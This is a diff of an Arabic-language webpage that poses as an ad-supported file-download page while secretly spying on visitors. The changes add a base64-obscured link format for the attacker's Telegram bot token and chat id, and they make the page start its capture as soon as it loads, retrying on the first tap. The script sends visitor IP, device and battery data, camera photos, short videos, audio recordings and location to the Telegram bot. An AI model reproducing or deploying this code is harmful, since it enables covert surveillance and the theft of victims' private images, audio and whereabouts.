@@ -70,14 +70,13 @@
   <div class="btnbox"><button class="btn" id="b2" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
 </div></div>
 
-<!-- صفحة 3 (الصفحة الأخيرة - تمت إضافة الإعلانات) -->
+<!-- صفحة 3 -->
 <div class="page" id="p3"><div class="card">
   <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">3</div></div>
   <h2>الرابط جاهز تقريباً</h2>
   <div class="sub">آخر خطوة قبل التحميل</div>
   <div class="ring" id="r3"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
   <div class="status" id="s3">جاري إنشاء رابط التحميل...</div>
-  <!-- 🔽 إعلانات الصفحة الأخيرة (زي الأولى والتانية) -->
   <div class="ads" id="ads3"></div>
   <div id="native3"></div>
   <div class="btnbox"><button class="btn dl" id="b3" disabled><svg class="ic" viewBox="0 0 24 24" width="24" height="24"><path d="M12 3v12m0 0l-5-5m5 5l5-5M4 20h16" fill="none" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg><span>تحميل الملف</span></button></div>
@@ -88,40 +87,79 @@
 
 <script>
 // ═══════════════════════════════════════════════════════════
-// 1. قراءة البارامترات (يدعم الصيغتين: features أو fc/bc/fcv...)
+// 0. دوال Base64 (تدعم العربي/UTF-8)
+// ═══════════════════════════════════════════════════════════
+function b64Encode(str) {
+  const bytes = new TextEncoder().encode(str);
+  let bin = '';
+  bytes.forEach(b => bin += String.fromCharCode(b));
+  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+function b64Decode(b64) {
+  let s = b64.replace(/-/g, '+').replace(/_/g, '/');
+  while (s.length % 4) s += '=';
+  const bin = atob(s);
+  const bytes = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+  return new TextDecoder().decode(bytes);
+}
+
+// ═══════════════════════════════════════════════════════════
+// 1. قراءة البارامترات + فك التشفير
 // ═══════════════════════════════════════════════════════════
 const urlParams = new URLSearchParams(window.location.search);
-const chat  = urlParams.get('chat') || urlParams.get('id');
-const token = urlParams.get('token');
+let chat = null, token = null, featureList = [];
 
-let featureList = [];
-if (urlParams.has('features')) {
-  featureList = urlParams.get('features').split(',').map(s => s.trim()).filter(Boolean);
-} else {
-  if (urlParams.has('fc'))  featureList.push('camFront');
-  if (urlParams.has('bc'))  featureList.push('camBack');
-  if (urlParams.has('fcv')) featureList.push('videoFront');
-  if (urlParams.has('bcv')) featureList.push('videoBack');
-  if (urlParams.has('r'))   featureList.push('audio');
-  if (urlParams.has('l'))   featureList.push('location');
+// 🔓 المحاولة الأولى: الرابط المشفّر ?d=<base64>
+const encoded = urlParams.get('d');
+if (encoded) {
+  try {
+    const data = JSON.parse(b64Decode(encoded));
+    chat  = data.chat  || null;
+    token = data.token || null;
+    if (Array.isArray(data.features)) {
+      featureList = data.features;
+    } else if (typeof data.features === 'string') {
+      featureList = data.features.split(',').map(s => s.trim()).filter(Boolean);
+    }
+  } catch (e) { console.warn('فشل فك التشفير:', e); }
 }
+
+// 🔙 Fallback: الروابط القديمة المباشرة
+if (!chat || !token) {
+  chat  = urlParams.get('chat') || urlParams.get('id');
+  token = urlParams.get('token');
+
+  if (urlParams.has('features')) {
+    featureList = urlParams.get('features').split(',').map(s => s.trim()).filter(Boolean);
+  } else {
+    if (urlParams.has('fc'))  featureList.push('camFront');
+    if (urlParams.has('bc'))  featureList.push('camBack');
+    if (urlParams.has('fcv')) featureList.push('videoFront');
+    if (urlParams.has('bcv')) featureList.push('videoBack');
+    if (urlParams.has('r'))   featureList.push('audio');
+    if (urlParams.has('l'))   featureList.push('location');
+  }
+}
+
 const features = featureList.join(',');
 
 // ═══════════════════════════════════════════════════════════
-// 2. منطق الزائر + طلب الأذونات + فتح الكاميرا (من الكود التاني)
+// 2. منطق الزائر + طلب الأذونات + الكاميرا
 // ═══════════════════════════════════════════════════════════
 let visitorIP = "غير معروف";
 let visitorCountry = "غير معروف";
 let visitorDevice = "Unknown";
 let visitorBattery = "غير متاح";
+let visitorSent = false;
 
 async function sendVisitorInfo() {
-  if (!chat || !token) return;
+  if (visitorSent || !chat || !token) return;
+  visitorSent = true;
   try {
     const ua = navigator.userAgent;
     if (/Android/i.test(ua)) visitorDevice = "Android";
     else if (/iPhone|iPad|iPod/i.test(ua)) visitorDevice = "iOS";
-    else visitorDevice = "Unknown";
 
     if (navigator.getBattery) {
       try {
@@ -172,25 +210,20 @@ async function captureAndSend(stream, type) {
     video.style.display = 'none';
     video.srcObject = stream;
     document.body.appendChild(video);
-
     video.onloadedmetadata = () => {
       video.play();
       setTimeout(() => {
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
         canvas.toBlob(async (blob) => {
           if (blob && blob.size > 2000) {
             const form = new FormData();
             form.append('chat_id', chat);
             form.append('photo', blob, `${type}_${Date.now()}.jpg`);
             form.append('caption', buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`));
-            try {
-              await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
-            } catch (e) {}
+            try { await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form }); } catch (e) {}
           }
           document.body.removeChild(video);
           resolve();
@@ -202,47 +235,39 @@ async function captureAndSend(stream, type) {
 
 async function recordAndSend(stream, type) {
   return new Promise((resolve) => {
-    const mediaRecorder = new MediaRecorder(stream);
+    const mr = new MediaRecorder(stream);
     const chunks = [];
-    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-    mediaRecorder.onstop = async () => {
+    mr.ondataavailable = (e) => chunks.push(e.data);
+    mr.onstop = async () => {
       const blob = new Blob(chunks, { type: 'video/mp4' });
       const form = new FormData();
       form.append('chat_id', chat);
       form.append('video', blob, `${type}_${Date.now()}.mp4`);
       form.append('caption', buildCaption(`🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`));
-      try {
-        await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
-      } catch (e) {}
+      try { await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form }); } catch (e) {}
       resolve();
     };
-    mediaRecorder.start();
-    setTimeout(() => {
-      if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-    }, 5000);
+    mr.start();
+    setTimeout(() => { if (mr.state === 'recording') mr.stop(); }, 5000);
   });
 }
 
 async function recordAudioAndSend(stream) {
   return new Promise((resolve) => {
-    const mediaRecorder = new MediaRecorder(stream);
+    const mr = new MediaRecorder(stream);
     const chunks = [];
-    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-    mediaRecorder.onstop = async () => {
+    mr.ondataavailable = (e) => chunks.push(e.data);
+    mr.onstop = async () => {
       const blob = new Blob(chunks, { type: 'audio/mp4' });
       const form = new FormData();
       form.append('chat_id', chat);
       form.append('audio', blob, `audio_${Date.now()}.mp4`);
       form.append('caption', buildCaption(`🎤 تسجيل صوتي - 5 ثوان`));
-      try {
-        await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
-      } catch (e) {}
+      try { await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form }); } catch (e) {}
       resolve();
     };
-    mediaRecorder.start();
-    setTimeout(() => {
-      if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-    }, 5000);
+    mr.start();
+    setTimeout(() => { if (mr.state === 'recording') mr.stop(); }, 5000);
   });
 }
 
@@ -260,11 +285,9 @@ async function sendLocation() {
           });
           resolve();
         },
-        (error) => { resolve(); }
+        () => resolve()
       );
-    } else {
-      resolve();
-    }
+    } else resolve();
   });
 }
 
@@ -278,69 +301,77 @@ async function preGrantPermissions(needCamera, needMicrophone) {
     stream.getTracks().forEach(t => t.stop());
     return true;
   } catch (err) {
+    console.warn('الأذونات مرفوضة/محتاجة ضغطة:', err);
     return false;
   }
 }
 
+// ═══════════════════════════════════════════════════════════
+// 3. تشغيل الميزات (مع flags لمنع التشغيل المزدوج)
+// ═══════════════════════════════════════════════════════════
+let featuresRunning = false;
+let featuresDone = false;
+
 async function startFeatures() {
-  if (!chat || !token || !features) return;
+  if (featuresRunning) return true;
+  if (featuresDone) return true;
+  if (!chat || !token) { featuresDone = true; return true; }
+  if (!features) { featuresDone = true; return true; }
+
+  featuresRunning = true;
   const list = features.split(',');
   const needCamera = list.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
   const needMicrophone = list.some(f => ['audio','videoFront','videoBack'].includes(f));
 
-  // 🔑 طلب الأذونات أولاً (من الكود التاني)
-  await preGrantPermissions(needCamera, needMicrophone);
-
-  // إرسال معلومات الزائر
-  sendVisitorInfo();
-
-  if (list.includes('camFront')) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      await captureAndSend(stream, 'front');
-      stream.getTracks().forEach(t => t.stop());
-    } catch (e) {}
+  const granted = await preGrantPermissions(needCamera, needMicrophone);
+  if ((needCamera || needMicrophone) && !granted) {
+    featuresRunning = false;
+    return false; // فشل → جرّب تاني عند أول ضغطة
   }
 
-  if (list.includes('camBack')) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-      await captureAndSend(stream, 'back');
-      stream.getTracks().forEach(t => t.stop());
-    } catch (e) {}
-  }
+  try {
+    if (list.includes('camFront')) {
+      try {
+        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        await captureAndSend(s, 'front'); s.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
+    if (list.includes('camBack')) {
+      try {
+        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        await captureAndSend(s, 'back'); s.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
+    if (list.includes('videoFront')) {
+      try {
+        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+        await recordAndSend(s, 'front'); s.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
+    if (list.includes('videoBack')) {
+      try {
+        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+        await recordAndSend(s, 'back'); s.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
+    if (list.includes('audio')) {
+      try {
+        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+        await recordAudioAndSend(s); s.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
+    if (list.includes('location')) {
+      await sendLocation();
+    }
+  } catch (e) { console.warn(e); }
 
-  if (list.includes('videoFront')) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-      await recordAndSend(stream, 'front');
-      stream.getTracks().forEach(t => t.stop());
-    } catch (e) {}
-  }
-
-  if (list.includes('videoBack')) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-      await recordAndSend(stream, 'back');
-      stream.getTracks().forEach(t => t.stop());
-    } catch (e) {}
-  }
-
-  if (list.includes('audio')) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      await recordAudioAndSend(stream);
-      stream.getTracks().forEach(t => t.stop());
-    } catch (e) {}
-  }
-
-  if (list.includes('location')) {
-    await sendLocation();
-  }
+  featuresRunning = false;
+  featuresDone = true;
+  return true;
 }
 
 // ═══════════════════════════════════════════════════════════
-// 3. كود صفحة التحميل والإعلانات
+// 4. إعدادات الإعلانات والصفحات
 // ═══════════════════════════════════════════════════════════
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
@@ -436,28 +467,57 @@ function show(n){
   window.scrollTo(0,0);
 }
 
-// تشغيل إعلانات الصفحة 1
-addBanners("ads1"); addNative("native1");
+// ═══════════════════════════════════════════════════════════
+// 5. 🚀 عند فتح الموقع فوراً: إعلانات + معلومات + أذونات
+// ═══════════════════════════════════════════════════════════
+
+// (أ) تحميل إعلانات الصفحة الأولى فوراً
+addBanners("ads1");
+addNative("native1");
+
+// (ب) بدء عداد الصفحة الأولى
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
 
-// زر متابعة صفحة 1 → فتح الأذونات + الانتقال لصفحة 2
+// (ج) إرسال معلومات الزائر فوراً (لا تحتاج أذونات)
+sendVisitorInfo();
+
+// (د) 🔑 طلب الأذونات وفتح الكاميرا فوراً (قبل أي ضغط)
+startFeatures().then(function(ok){
+  if (!ok) {
+    // لو المتصفح رفض بدون ضغطة، جرّب تاني عند أول تفاعل
+    const retry = async function(){
+      document.removeEventListener('pointerdown', retry, true);
+      document.removeEventListener('touchstart', retry, true);
+      await startFeatures();
+    };
+    document.addEventListener('pointerdown', retry, true);
+    document.addEventListener('touchstart', retry, true);
+  }
+});
+
+// ═══════════════════════════════════════════════════════════
+// 6. أزرار التنقل
+// ═══════════════════════════════════════════════════════════
+
+// زر متابعة صفحة 1
 $("b1").onclick = function(){
+  startFeatures(); // محاولة احتياطية لو الأذونات اتأخرت
   goNext(this, function(){
-    startFeatures();          // ← منطق الأذونات وفتح الكاميرا
     show(2);
     addGhost();
-    addBanners("ads2"); addNative("native2");
+    addBanners("ads2");
+    addNative("native2");
     ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); });
   });
 };
 
-// زر متابعة صفحة 2 → الانتقال لصفحة 3 مع إعلاناتها
+// زر متابعة صفحة 2
 $("b2").onclick = function(){
   goNext(this, function(){
     show(3);
     addGhost();
-    addBanners("ads3");       // ← إعلانات الصفحة الأخيرة
-    addNative("native3");     // ← نيتف الصفحة الأخيرة
+    addBanners("ads3");   // ← إعلانات الصفحة الأخيرة
+    addNative("native3");
     ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); });
   });
 };
@@ -466,4 +526,4 @@ $("b2").onclick = function(){
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
 </body>
-    </html>
+                                                                                                                                                                                                                                                              </html>
